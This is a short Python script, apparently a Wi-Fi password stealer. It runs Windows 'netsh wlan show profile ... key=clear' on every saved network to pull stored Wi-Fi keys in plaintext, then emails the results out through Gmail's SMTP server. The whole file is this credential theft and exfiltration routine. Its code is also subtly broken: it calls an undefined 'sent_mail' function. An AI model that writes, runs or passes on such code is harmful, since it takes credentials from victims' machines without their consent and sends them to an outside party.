#!/usr/bin/env python
import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile  "#Windows command, Linux or OSX
result = subprocess.check_output(command, shell=True)
network_name_list = re.findall("(?:Profile\s*:\s)(.*)", result)
result = ""
for network_name in network_name_list:
    result_h = subprocess.check_output(command+network_name+" key=clear", shell=True)
    result = result + result_h
sent_mail("test@gmail.com", "test", result)